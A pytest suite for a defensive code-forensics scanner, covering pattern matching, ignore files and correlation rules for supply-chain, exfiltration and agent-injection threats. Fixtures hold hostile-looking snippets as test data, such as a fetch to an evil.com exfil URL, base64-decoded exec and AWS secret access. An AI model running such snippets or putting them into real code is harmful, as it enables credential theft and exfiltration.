"""Tests for forensics_core.py - shared infrastructure."""

import math
import os
import json
import pytest
import forensics_core as core


class TestFinding:
    def test_finding_creation(self):
        f = core.Finding(
            scanner="test", severity="high", title="Test Issue",
            description="A test finding", file="test.py", line=42,
            snippet="x = 1", category="test"
        )
        assert f.scanner == "test"
        assert f.severity == "high"
        assert f.severity_score() == 3

    def test_severity_scores(self):
        for sev, expected in [("critical", 4), ("high", 3), ("medium", 2), ("low", 1)]:
            f = core.Finding("s", sev, "t", "d", "f", 0, "", "c")
            assert f.severity_score() == expected

    def test_unknown_severity(self):
        f = core.Finding("s", "unknown", "t", "d", "f", 0, "", "c")
        assert f.severity_score() == 0

    def test_to_dict(self):
        f = core.Finding("s", "high", "Test", "desc", "f.py", 1, "code", "cat")
        d = f.to_dict()
        assert d["scanner"] == "s"
        assert d["severity"] == "high"
        assert d["file"] == "f.py"

    def test_format_text(self):
        f = core.Finding("s", "critical", "Bad Thing", "desc", "evil.py", 10, "code", "c")
        text = f.format_text()
        assert "[CRITICAL]" in text
        assert "Bad Thing" in text
        assert "evil.py:10" in text


class TestScanPatterns:
    def test_basic_match(self):
        import re
        patterns = [(re.compile(r'eval\('), "eval call")]
        findings = core.scan_patterns("x = eval('code')\n", "test.py", patterns, "sast", "high", "test")
        assert len(findings) == 1
        assert findings[0].title == "eval call"
        assert findings[0].line == 1

    def test_no_match(self):
        import re
        patterns = [(re.compile(r'eval\('), "eval call")]
        findings = core.scan_patterns("x = print('safe')\n", "test.py", patterns, "sast", "high", "test")
        assert len(findings) == 0

    def test_long_line_truncated_not_skipped(self):
        # C3: a pattern match within the first MAX_LINE_LENGTH chars of a very
        # long line MUST still be detected (truncate, not skip).  The old behavior
        # silently skipped long lines, creating a detection-evasion hole.
        import re
        patterns = [(re.compile(r'secret'), "secret found")]
        long_line = "secret " + "x" * (core.MAX_LINE_LENGTH + 1)
        findings = core.scan_patterns(long_line, "test.py", patterns, "sast", "high", "test")
        # The secret is in the first 7 chars — well within MAX_LINE_LENGTH prefix.
        assert len(findings) == 1
        assert findings[0].title == "secret found"

    def test_long_line_past_truncation_not_detected(self):
        # A pattern that only appears AFTER the MAX_LINE_LENGTH boundary is NOT
        # detected — this is the accepted tradeoff that bounds regex input length.
        import re
        patterns = [(re.compile(r'BOUNDARY'), "boundary match")]
        long_line = "x" * (core.MAX_LINE_LENGTH + 1) + "BOUNDARY"
        findings = core.scan_patterns(long_line, "test.py", patterns, "sast", "high", "test")
        assert len(findings) == 0

    def test_scanner_name_propagated(self):
        import re
        patterns = [(re.compile(r'test'), "match")]
        findings = core.scan_patterns("test\n", "f.py", patterns, "c", "low", "my_scanner")
        assert findings[0].scanner == "my_scanner"

    # --- C3: scan_rule_patterns also truncates long lines ---

    def test_c3_rule_patterns_long_line_truncated_not_skipped(self):
        """C3: scan_rule_patterns must truncate, not skip, lines longer than
        MAX_LINE_LENGTH — same contract as scan_patterns (closing the evasion
        hole where a secret hidden on a 10001-char line was invisible)."""
        import re
        import sys
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(
            os.path.abspath(__file__))), "scripts"))
        # Build a minimal CompiledRule-like object without importing rule_loader
        # (KTD-14: forensics_core does not import rule_loader).
        class _FakeRule:
            def __init__(self):
                self.regex = re.compile(r'SECRET')
                self.title = "fake secret"
                self.id = "FAKE-001"
                self.confidence = 0.9
        long_line = "SECRET " + "x" * (core.MAX_LINE_LENGTH + 1)
        findings = core.scan_rule_patterns(
            long_line, "test.py", [_FakeRule()],
            "test-cat", "high", "test_scanner",
        )
        assert len(findings) == 1, (
            "scan_rule_patterns skipped a long line instead of truncating it "
            "(C3: detection-evasion hole)"
        )

    # --- C2: coarse per-file scan budget aborting runaway scan ---

    def test_c2_per_file_budget_aborts_overlong_scan(self, monkeypatch, capsys):
        """C2: if a scan takes longer than _SCAN_FILE_BUDGET_SEC the loop aborts
        and emits a diagnostic to stderr.  We simulate a slow regex by monkeypatching
        time.monotonic to advance by 1 second per budget-check interval so the
        budget appears exhausted immediately after the first interval check."""
        import re
        import time

        call_count = [0]
        real_monotonic = time.monotonic
        base_t = real_monotonic()

        def _fast_forward():
            call_count[0] += 1
            # First call (loop start _t0) returns base; every subsequent call
            # returns a value well past _SCAN_FILE_BUDGET_SEC so the budget
            # check fires after the first interval.
            if call_count[0] == 1:
                return base_t
            return base_t + core._SCAN_FILE_BUDGET_SEC + 1.0

        monkeypatch.setattr(time, "monotonic", _fast_forward)

        # Build content with enough lines to trigger the interval check (interval + 1).
        n = core._SCAN_BUDGET_CHECK_INTERVAL + 1
        content = ("target\n" * n)
        patterns = [(re.compile(r"target"), "found")]
        findings = core.scan_patterns(
            content, "big.py", patterns, "sast", "high", "test"
        )
        err = capsys.readouterr().err
        # The scan must have emitted a budget-exceeded diagnostic.
        assert "budget exceeded" in err, (
            "Expected per-file budget diagnostic on stderr, got nothing.  "
            "C2 coarse scan budget may not be wired up."
        )
        # And it must have aborted before finding everything (fewer than n matches).
        assert len(findings) < n, (
            "scan_patterns found all lines even after budget exceeded — "
            "the break statement may be missing."
        )


class TestForensicsIgnore:
    def test_load_empty(self, tmp_path):
        patterns = core.load_ignore_patterns(str(tmp_path))
        assert patterns == []

    def test_load_patterns(self, tmp_path):
        ignore_file = tmp_path / ".forensicsignore"
        ignore_file.write_text("tests/*\n# comment\nvendor/\n")
        patterns = core.load_ignore_patterns(str(tmp_path))
        assert "tests/*" in patterns
        assert "vendor/" in patterns
        assert len(patterns) == 2  # comment excluded

    def test_should_ignore_glob(self, tmp_path):
        assert core.should_ignore(str(tmp_path / "tests/foo.py"), str(tmp_path), ["tests/*"])

    def test_should_not_ignore(self, tmp_path):
        assert not core.should_ignore(str(tmp_path / "src/main.py"), str(tmp_path), ["tests/*"])

    def test_wildcard_suppression_warning(self, tmp_path):
        ignore_file = tmp_path / ".forensicsignore"
        ignore_file.write_text("*\n")
        findings = core.warn_forensicsignore(str(tmp_path))
        assert len(findings) == 1
        assert findings[0].severity == "critical"
        assert "Wildcard" in findings[0].title


class TestWalkRepo:
    def test_walks_files(self, tmp_path):
        (tmp_path / "main.py").write_text("print('hi')")
        (tmp_path / "sub").mkdir()
        (tmp_path / "sub" / "util.py").write_text("pass")
        files = list(core.walk_repo(str(tmp_path)))
        rel_paths = [rp for _, rp in files]
        assert "main.py" in rel_paths
        assert os.path.join("sub", "util.py") in rel_paths

    def test_skips_git(self, tmp_path):
        (tmp_path / ".git").mkdir()
        (tmp_path / ".git" / "config").write_text("x")
        (tmp_path / "main.py").write_text("x")
        files = list(core.walk_repo(str(tmp_path)))
        rel_paths = [rp for _, rp in files]
        assert "main.py" in rel_paths
        assert not any(".git" in rp for rp in rel_paths)

    def test_skips_binary(self, tmp_path):
        (tmp_path / "image.png").write_bytes(b'\x89PNG\r\n')
        (tmp_path / "main.py").write_text("x")
        files = list(core.walk_repo(str(tmp_path)))
        rel_paths = [rp for _, rp in files]
        assert "main.py" in rel_paths
        assert "image.png" not in rel_paths

    def test_respects_ignore(self, tmp_path):
        (tmp_path / ".forensicsignore").write_text("vendor/*\n")
        (tmp_path / "vendor").mkdir()
        (tmp_path / "vendor" / "lib.py").write_text("x")
        (tmp_path / "main.py").write_text("x")
        files = list(core.walk_repo(str(tmp_path)))
        rel_paths = [rp for _, rp in files]
        assert "main.py" in rel_paths


class TestCorrelation:
    def test_env_plus_network(self):
        findings = [
            core.Finding("secrets", "high", "Env Access", "environ access", "app.py", 1, "", "env access"),
            core.Finding("sast", "high", "HTTP POST", "network post request", "app.py", 5, "", "network"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Potential Data Exfiltration" in titles

    def test_encoding_plus_exec(self):
        findings = [
            core.Finding("entropy", "high", "Base64 Block", "base64 encoding", "evil.py", 1, "", "encoding"),
            core.Finding("sast", "critical", "eval()", "eval code execution", "evil.py", 3, "", "exec"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Obfuscated Code Execution" in titles

    def test_no_correlation_different_files(self):
        findings = [
            core.Finding("secrets", "high", "Env Access", "environ", "a.py", 1, "", "env access"),
            core.Finding("sast", "high", "HTTP POST", "network post", "b.py", 5, "", "network"),
        ]
        correlated = core.correlate(findings)
        assert len(correlated) == 0

    def test_prompt_injection_plus_exec(self):
        findings = [
            core.Finding("skill_threats", "critical", "Override", "prompt injection", "evil.md", 1, "", "prompt injection"),
            core.Finding("sast", "high", "exec()", "code execution", "evil.md", 3, "", "exec"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Prompt-Assisted Code Execution" in titles

    def test_deferred_payload_loading(self):
        """Rule 9: dynamic import + network = Deferred Payload Loading."""
        findings = [
            core.Finding("runtime_dynamism", "high", "Dynamic Import", "importlib dynamic-import", "evil.py", 1, "", "dynamic-import"),
            core.Finding("dataflow", "high", "HTTP GET", "network fetch request", "evil.py", 5, "", "network"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Deferred Payload Loading" in titles

    def test_time_triggered_malware(self):
        """Rule 10: time bomb + exec = Time-Triggered Malware."""
        findings = [
            core.Finding("runtime_dynamism", "high", "Time Bomb", "datetime comparison time-bomb", "evil.py", 1, "", "time-bomb"),
            core.Finding("sast", "high", "exec()", "eval code execution", "evil.py", 5, "", "exec"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Time-Triggered Malware" in titles

    def test_mcp_rug_pull_enabler(self):
        """Rule 11: dynamic description + MCP server = MCP Rug Pull Enabler."""
        findings = [
            core.Finding("runtime_dynamism", "high", "Dynamic Desc", "dynamic tool description dynamic-description", "server.py", 1, "", "dynamic-description"),
            core.Finding("mcp_security", "critical", "MCP Config", "mcp_security config risk", "server.py", 5, "", "mcp-config"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "MCP Rug Pull Enabler" in titles

    def test_shadow_dependency_with_network(self):
        """Rule 12: phantom dep + network = Shadow Dependency with Network."""
        findings = [
            core.Finding("manifest_drift", "high", "Phantom Dep", "phantom-dependency shadow dependency", "evil.py", 0, "", "phantom-dependency"),
            core.Finding("dataflow", "high", "HTTP POST", "network post request", "evil.py", 5, "", "network"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Shadow Dependency with Network Access" in titles


    def test_process_env_error_handler_chain(self):
        """Rule 20: process.env exposure + error handler = secret leak chain."""
        findings = [
            core.Finding("sast", "high", "process.env Logged to Console", "secret-exposure vulnerability", "app.js", 10, "console.log(process.env)", "secret-exposure"),
            core.Finding("sast", "high", "Error Handler", "uncaughtException handler", "app.js", 20, "process.on('uncaughtException')", "error-handling"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Secrets Leaked via Error Handler" in titles

    def test_process_env_no_error_handler_no_correlation(self):
        """Rule 20 should NOT fire without error handler in same file."""
        findings = [
            core.Finding("sast", "high", "process.env Logged to Console", "secret-exposure", "app.js", 10, "", "secret-exposure"),
        ]
        correlated = core.correlate(findings)
        assert not any("Error Handler" in c.title for c in correlated)

    def test_devcontainer_secret_exposure_chain(self):
        """Rule 21: devcontainer host mount + credential access = compound threat."""
        findings = [
            core.Finding("devcontainer", "critical", "Host Secret Mount", "host-secret-exposure mount .ssh", "devcontainer.json", 0, "", "host-secret-exposure"),
            core.Finding("devcontainer", "high", "Remote Fetch in initializeCommand", "credential exfiltration via curl", "devcontainer.json", 0, "", "remote-code-execution"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Devcontainer Secret Exposure Chain" in titles

    def test_devcontainer_no_credential_access_no_correlation(self):
        """Rule 21 should NOT fire without credential access pattern."""
        findings = [
            core.Finding("devcontainer", "critical", "Host Secret Mount", "host-secret-exposure", "devcontainer.json", 0, "", "host-secret-exposure"),
        ]
        correlated = core.correlate(findings)
        assert not any("Devcontainer" in c.title for c in correlated)


class TestOutputFormatting:
    def test_json_output(self):
        findings = [core.Finding("s", "high", "Test", "d", "f.py", 1, "c", "cat")]
        output = core.format_findings(findings, "json")
        data = json.loads(output)
        assert len(data) == 1
        assert data[0]["title"] == "Test"

    def test_summary_output(self):
        findings = [
            core.Finding("s", "critical", "A", "d", "f", 0, "", "c"),
            core.Finding("s", "high", "B", "d", "f", 0, "", "c"),
            core.Finding("s", "high", "C", "d", "f", 0, "", "c"),
        ]
        output = core.format_findings(findings, "summary")
        assert "CRITICAL: 1" in output
        assert "HIGH: 2" in output

    def test_text_sorted_by_severity(self):
        findings = [
            core.Finding("s", "low", "Low", "d", "f", 0, "", "c"),
            core.Finding("s", "critical", "Critical", "d", "f", 0, "", "c"),
        ]
        output = core.format_findings(findings, "text")
        crit_pos = output.index("Critical")
        low_pos = output.index("Low")
        assert crit_pos < low_pos

    def test_empty_findings(self):
        assert core.format_findings([], "text") == "  No findings."


class TestRepoWideCorrelation:
    """Tests for Rules 30-31: repo-wide correlation (Terra Security OpenClaw)."""

    def test_rule_30_staged_injection(self):
        findings = [
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel pattern in ROUTINE.md", "ROUTINE.md", 1, "", "update-channel"),
            core.Finding("skill_threats", "medium", "Prose Imperative",
                "prose-imperative exfiltration instruction", "CHANGELOG.md", 5, "", "prose-imperative"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert any("Staged Injection" in t for t in titles)
        staged = [c for c in correlated if "Staged Injection" in c.title]
        assert staged[0].severity == "critical"

    def test_rule_31_workspace_persistence(self):
        findings = [
            core.Finding("agent_skills", "high", "Config write request",
                "config-write-request to HEARTBEAT.md", "SKILL.md", 1, "", "config-write-request"),
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel in ROUTINE.md", "ROUTINE.md", 3, "", "update-channel"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert any("Workspace Persistence" in t for t in titles)

    def test_both_rules_fire_together(self):
        findings = [
            core.Finding("agent_skills", "high", "Config write request",
                "config-write-request", "SKILL.md", 1, "", "config-write-request"),
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel", "ROUTINE.md", 3, "", "update-channel"),
            core.Finding("skill_threats", "medium", "Prose Imperative",
                "prose-imperative", "CHANGELOG.md", 5, "", "prose-imperative"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert any("Staged Injection" in t for t in titles)
        assert any("Workspace Persistence" in t for t in titles)

    def test_update_channel_alone_no_rule_30(self):
        findings = [
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel", "ROUTINE.md", 1, "", "update-channel"),
        ]
        correlated = core.correlate(findings)
        assert not any("Staged Injection" in c.title for c in correlated)

    def test_prose_imperative_alone_no_rule_30(self):
        findings = [
            core.Finding("skill_threats", "medium", "Prose Imperative",
                "prose-imperative", "CHANGELOG.md", 5, "", "prose-imperative"),
        ]
        correlated = core.correlate(findings)
        assert not any("Staged Injection" in c.title for c in correlated)

    def test_rule_30_fires_same_file(self):
        findings = [
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel", "ROUTINE.md", 1, "", "update-channel"),
            core.Finding("skill_threats", "medium", "Prose Imperative",
                "prose-imperative", "ROUTINE.md", 10, "", "prose-imperative"),
        ]
        correlated = core.correlate(findings)
        assert any("Staged Injection" in c.title for c in correlated)


class TestDirsOverlap:
    """Tests for the _dirs_overlap proximity function used by Rules 30-36."""

    def test_same_directory_overlaps(self):
        """Two findings in the same directory should correlate."""
        findings = [
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel", "subdir/ROUTINE.md", 1, "", "update-channel"),
            core.Finding("skill_threats", "medium", "Prose Imperative",
                "prose-imperative", "subdir/CHANGELOG.md", 5, "", "prose-imperative"),
        ]
        correlated = core.correlate(findings)
        assert any("Staged Injection" in c.title for c in correlated)

    def test_nested_directory_overlaps(self):
        """Two findings in nested directories (a/ and a/b/) should correlate."""
        findings = [
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel", "skills/ROUTINE.md", 1, "", "update-channel"),
            core.Finding("skill_threats", "medium", "Prose Imperative",
                "prose-imperative", "skills/sub/CHANGELOG.md", 5, "", "prose-imperative"),
        ]
        correlated = core.correlate(findings)
        assert any("Staged Injection" in c.title for c in correlated)

    def test_different_directories_no_overlap(self):
        """Two findings in completely different directory trees should NOT correlate."""
        findings = [
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel", "alpha/ROUTINE.md", 1, "", "update-channel"),
            core.Finding("skill_threats", "medium", "Prose Imperative",
                "prose-imperative", "beta/CHANGELOG.md", 5, "", "prose-imperative"),
        ]
        correlated = core.correlate(findings)
        assert not any("Staged Injection" in c.title for c in correlated)

    def test_root_level_always_overlaps(self):
        """A finding at root (empty dir) should always overlap with anything."""
        findings = [
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel", "ROUTINE.md", 1, "", "update-channel"),
            core.Finding("skill_threats", "medium", "Prose Imperative",
                "prose-imperative", "deep/nested/CHANGELOG.md", 5, "", "prose-imperative"),
        ]
        correlated = core.correlate(findings)
        assert any("Staged Injection" in c.title for c in correlated)


class TestNewCorrelationRules:
    """Tests for correlation Rules 32-36."""

    def test_rule_32_sub_agent_hijack_exfiltration(self):
        """Rule 32: sub-agent-spawn + credential-exfiltration -> Sub-Agent Hijack Exfiltration Chain."""
        findings = [
            core.Finding("skill_threats", "high", "Sub-agent spawn directive",
                "sub-agent-spawn directive", "SKILL.md", 1, "", "sub-agent-spawn"),
            core.Finding("skill_threats", "critical", "Credential exfiltration pattern",
                "credential-exfiltration via webhook", "evil.py", 5, "", "credential-exfiltration"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert any("Sub-Agent Hijack" in t for t in titles)
        hijack = [c for c in correlated if "Sub-Agent Hijack" in c.title]
        assert hijack[0].severity == "critical"

    def test_rule_32_no_fire_different_dirs(self):
        """Rule 32 should NOT fire when findings are in different directory trees."""
        findings = [
            core.Finding("skill_threats", "high", "Sub-agent spawn directive",
                "sub-agent-spawn directive", "alpha/SKILL.md", 1, "", "sub-agent-spawn"),
            core.Finding("skill_threats", "critical", "Credential exfiltration pattern",
                "credential-exfiltration via webhook", "beta/evil.py", 5, "", "credential-exfiltration"),
        ]
        correlated = core.correlate(findings)
        assert not any("Sub-Agent Hijack" in c.title for c in correlated)

    def test_rule_33_social_engineering_assisted(self):
        """Rule 33: authority-framing + code-execution -> Social Engineering Assisted Attack."""
        findings = [
            core.Finding("skill_threats", "medium", "Authority claim: impersonating admin",
                "authority-framing claim", "SKILL.md", 1, "", "authority-framing"),
            core.Finding("sast", "high", "Dangerous Exec",
                "code-execution vulnerability", "evil.py", 5, "", "code-execution"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert any("Social Engineering Assisted" in t for t in titles)
        se = [c for c in correlated if "Social Engineering Assisted" in c.title]
        assert se[0].severity == "high"

    def test_rule_33_no_fire_different_dirs(self):
        """Rule 33 should NOT fire when findings are in different directory trees."""
        findings = [
            core.Finding("skill_threats", "medium", "Authority claim: impersonating admin",
                "authority-framing claim", "dir_a/SKILL.md", 1, "", "authority-framing"),
            core.Finding("sast", "high", "Dangerous Exec",
                "code-execution vulnerability", "dir_b/evil.py", 5, "", "code-execution"),
        ]
        correlated = core.correlate(findings)
        assert not any("Social Engineering Assisted" in c.title for c in correlated)

    def test_rule_34_persistent_memory_backdoor(self):
        """Rule 34: memory-poisoning + prompt-injection -> Persistent Memory Backdoor."""
        findings = [
            core.Finding("agent_skills", "high", "Memory write with injection keywords",
                "memory-poisoning indicator", "evil.md", 1, "", "memory-poisoning"),
            core.Finding("skill_threats", "critical", "Instruction override directive",
                "prompt injection directive", "evil.md", 3, "", "prompt-injection"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert any("Persistent Memory Backdoor" in t for t in titles)
        mem = [c for c in correlated if "Persistent Memory Backdoor" in c.title]
        assert mem[0].severity == "critical"

    def test_rule_34_no_fire_different_dirs(self):
        """Rule 34 should NOT fire when findings are in different directory trees."""
        findings = [
            core.Finding("agent_skills", "high", "Memory write with injection keywords",
                "memory-poisoning indicator", "left/evil.md", 1, "", "memory-poisoning"),
            core.Finding("skill_threats", "critical", "Instruction override directive",
                "prompt injection directive", "right/evil.md", 3, "", "prompt-injection"),
        ]
        correlated = core.correlate(findings)
        assert not any("Persistent Memory Backdoor" in c.title for c in correlated)

    def test_rule_35_hidden_instruction_via_visual_steganography(self):
        """Rule 35: css-steganography + prompt-injection -> Hidden Instruction via Visual Steganography."""
        findings = [
            core.Finding("sast", "medium", "CSS hiding: display:none",
                "css-steganography visual hiding", "evil.html", 1, "", "css-steganography"),
            core.Finding("skill_threats", "critical", "Instruction override directive",
                "prompt injection directive", "evil.html", 3, "", "prompt-injection"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert any("Hidden Instruction via Visual Steganography" in t for t in titles)
        steg = [c for c in correlated if "Hidden Instruction via Visual Steganography" in c.title]
        assert steg[0].severity == "critical"

    def test_rule_35_no_fire_different_dirs(self):
        """Rule 35 should NOT fire when findings are in different directory trees."""
        findings = [
            core.Finding("sast", "medium", "CSS hiding: display:none",
                "css-steganography visual hiding", "pages/evil.html", 1, "", "css-steganography"),
            core.Finding("skill_threats", "critical", "Instruction override directive",
                "prompt injection directive", "skills/evil.md", 3, "", "prompt-injection"),
        ]
        correlated = core.correlate(findings)
        assert not any("Hidden Instruction via Visual Steganography" in c.title for c in correlated)

    def test_rule_36_deferred_sub_agent_injection(self):
        """Rule 36: update-channel + sub-agent-spawn -> Deferred Sub-Agent Injection."""
        findings = [
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel pattern", "ROUTINE.md", 1, "", "update-channel"),
            core.Finding("skill_threats", "high", "Sub-agent spawn directive",
                "sub-agent-spawn directive", "SKILL.md", 3, "", "sub-agent-spawn"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert any("Deferred Sub-Agent Injection" in t for t in titles)
        deferred = [c for c in correlated if "Deferred Sub-Agent Injection" in c.title]
        assert deferred[0].severity == "critical"

    def test_rule_36_no_fire_different_dirs(self):
        """Rule 36 should NOT fire when findings are in different directory trees."""
        findings = [
            core.Finding("skill_threats", "high", "Deferred update channel",
                "update-channel pattern", "foo/ROUTINE.md", 1, "", "update-channel"),
            core.Finding("skill_threats", "high", "Sub-agent spawn directive",
                "sub-agent-spawn directive", "bar/SKILL.md", 3, "", "sub-agent-spawn"),
        ]
        correlated = core.correlate(findings)
        assert not any("Deferred Sub-Agent Injection" in c.title for c in correlated)


class TestRule37GeofencedDestructive:
    """Tests for Rule 37: locale-gating + destructive-command = Geofenced Destructive Command."""

    def test_python_locale_plus_rmtree(self):
        """locale.getdefaultlocale() + shutil.rmtree() -> CRITICAL correlation."""
        findings = [
            core.Finding("runtime_dynamism", "medium", "Locale gating: locale.getdefaultlocale()",
                "Matched in locale-gating scan", "evil.py", 3, "", "locale-gating"),
            core.Finding("sast", "critical", "Destructive: shutil.rmtree on Home",
                "shutil.rmtree on home directory", "evil.py", 10, "", "destructive-command"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Geofenced Destructive Command" in titles
        geo = [c for c in correlated if c.title == "Geofenced Destructive Command"]
        assert geo[0].severity == "critical"

    def test_shell_lang_plus_rm_rf(self):
        """$LANG conditional + rm -rf -> CRITICAL correlation."""
        findings = [
            core.Finding("runtime_dynamism", "medium", "Locale gating: $LANG/$LC shell variable",
                "Matched in locale-gating scan", "evil.sh", 2, "", "locale-gating"),
            core.Finding("sast", "critical", "Destructive: Home Directory Wipe",
                "rm -rf on home directory", "evil.sh", 8, "", "destructive-command"),
        ]
        correlated = core.correlate(findings)
        assert any("Geofenced Destructive" in c.title for c in correlated)

    def test_locale_only_no_correlation(self):
        """Locale check without destructive command -> no geofenced finding."""
        findings = [
            core.Finding("runtime_dynamism", "medium", "Locale gating: locale.getdefaultlocale()",
                "Matched in locale-gating scan", "i18n.py", 3, "", "locale-gating"),
        ]
        correlated = core.correlate(findings)
        assert not any("Geofenced" in c.title for c in correlated)

    def test_destructive_only_no_correlation(self):
        """Destructive command without locale check -> no geofenced finding."""
        findings = [
            core.Finding("sast", "critical", "Destructive: shutil.rmtree on Home",
                "shutil.rmtree on home directory", "cleanup.py", 5, "", "destructive-command"),
        ]
        correlated = core.correlate(findings)
        assert not any("Geofenced" in c.title for c in correlated)

    def test_different_files_no_correlation(self):
        """Locale in one file, destructive in another -> no correlation (per-file rule)."""
        findings = [
            core.Finding("runtime_dynamism", "medium", "Locale gating: locale.getdefaultlocale()",
                "Matched in locale-gating scan", "utils.py", 3, "", "locale-gating"),
            core.Finding("sast", "critical", "Destructive: shutil.rmtree on Home",
                "shutil.rmtree on home directory", "cleanup.py", 5, "", "destructive-command"),
        ]
        correlated = core.correlate(findings)
        assert not any("Geofenced" in c.title for c in correlated)


class TestEntrypointCorrelation:
    """Tests for Rules 40-41: entrypoint payload correlation."""

    def test_entrypoint_iife_plus_env_access_fires_rule_40(self):
        """Rule 40: entrypoint-iife + credential/env finding -> Credential Theft via require()."""
        findings = [
            core.Finding(scanner="entrypoint", severity="high",
                title="IIFE Entrypoint Payload",
                description="Immediately-invoked function expression at module entrypoint",
                file="test.js", line=1,
                snippet="(function(){})();",
                category="entrypoint-iife"),
            core.Finding(scanner="sast", severity="high",
                title="Environment Variable Access",
                description="process.env credential access detected",
                file="test.js", line=5,
                snippet="process.env.AWS_SECRET_ACCESS_KEY",
                category="credential-access"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Supply Chain Entrypoint: Credential Theft via require()/import" in titles
        rule40 = [c for c in correlated if c.title == "Supply Chain Entrypoint: Credential Theft via require()/import"]
        assert rule40[0].severity == "critical"
        assert rule40[0].category == "entrypoint-credential-chain"
        assert rule40[0].file == "test.js"

    def test_entrypoint_plus_network_fires_rule_41(self):
        """Rule 41: entrypoint + network/fetch finding -> Data Exfiltration via require()."""
        findings = [
            core.Finding(scanner="entrypoint", severity="high",
                title="Import-Time Exec Payload",
                description="Code execution triggered at import/require entrypoint",
                file="evil.js", line=1,
                snippet="require('./payload')",
                category="entrypoint-import-exec"),
            core.Finding(scanner="sast", severity="high",
                title="Outbound HTTP Fetch",
                description="fetch() call to external network endpoint",
                file="evil.js", line=8,
                snippet="fetch('https://evil.com/exfil')",
                category="network-call"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Supply Chain Entrypoint: Data Exfiltration via require()/import" in titles
        rule41 = [c for c in correlated if c.title == "Supply Chain Entrypoint: Data Exfiltration via require()/import"]
        assert rule41[0].severity == "critical"
        assert rule41[0].category == "entrypoint-exfiltration-chain"
        assert rule41[0].file == "evil.js"

    def test_entrypoint_alone_no_correlation(self):
        """Entrypoint finding without credential or network -> no Rules 40/41."""
        findings = [
            core.Finding(scanner="entrypoint", severity="high",
                title="IIFE Entrypoint Payload",
                description="Immediately-invoked function expression at module entrypoint",
                file="index.js", line=1,
                snippet="(function(){console.log('hi')})();",
                category="entrypoint-iife"),
        ]
        correlated = core.correlate(findings)
        assert not any("Entrypoint" in c.title for c in correlated)

    def test_python_import_exec_plus_env_fires_rule_40(self):
        """Rule 40: entrypoint-import-exec + os.environ access -> Credential Theft via require()."""
        findings = [
            core.Finding(scanner="entrypoint", severity="high",
                title="Import-Time Code Execution",
                description="Code executes at Python import via __init__.py entrypoint-import-exec pattern",
                file="malicious/__init__.py", line=3,
                snippet="exec(base64.b64decode(PAYLOAD))",
                category="entrypoint-import-exec"),
            core.Finding(scanner="sast", severity="medium",
                title="Environment Variable Enumeration",
                description="os.environ access reads all environment variables",
                file="malicious/__init__.py", line=10,
                snippet="os.environ.copy()",
                category="env-access"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "Supply Chain Entrypoint: Credential Theft via require()/import" in titles
        rule40 = [c for c in correlated if c.title == "Supply Chain Entrypoint: Credential Theft via require()/import"]
        assert rule40[0].severity == "critical"
        assert rule40[0].file == "malicious/__init__.py"


class TestRule38CIRunnerMemoryExtraction:
    """Tests for Rule 38: proc-mem-read + process-enumeration = CI Runner Memory Extraction."""

    def test_python_proc_mem_plus_listdir(self):
        """open('/proc/1234/mem') + os.listdir('/proc') -> CRITICAL correlation."""
        findings = [
            core.Finding("sast", "critical", "Process Memory Read (/proc)",
                "memory-forensics /proc/1234/mem", "evil.py", 5, "", "memory-forensics"),
            core.Finding("sast", "high", "Process Enumeration (/proc)",
                "process-enumeration /proc/ listing", "evil.py", 3, "", "process-enumeration"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        assert "CI Runner Memory Extraction" in titles
        ci = [c for c in correlated if c.title == "CI Runner Memory Extraction"]
        assert ci[0].severity == "critical"

    def test_shell_dd_proc_mem_plus_runner_worker(self):
        """dd if=/proc/1234/mem + Runner.Worker grep -> CRITICAL correlation."""
        findings = [
            core.Finding("sast", "critical", "Process Memory Read (/proc)",
                "memory-forensics /proc/1234/mem dd", "evil.sh", 10, "", "memory-forensics"),
            core.Finding("sast", "critical", "Runner.Worker Process Hunt",
                "process-enumeration Runner.Worker grep", "evil.sh", 5, "", "process-enumeration"),
        ]
        correlated = core.correlate(findings)
        assert any("CI Runner Memory Extraction" in c.title for c in correlated)

    def test_proc_self_mem_no_enumeration(self):
        """/proc/self/mem alone without process enumeration -> no correlation."""
        findings = [
            core.Finding("sast", "critical", "Process Memory Read (/proc)",
                "memory-forensics /proc/self/mem", "debug.go", 5, "", "memory-forensics"),
        ]
        correlated = core.correlate(findings)
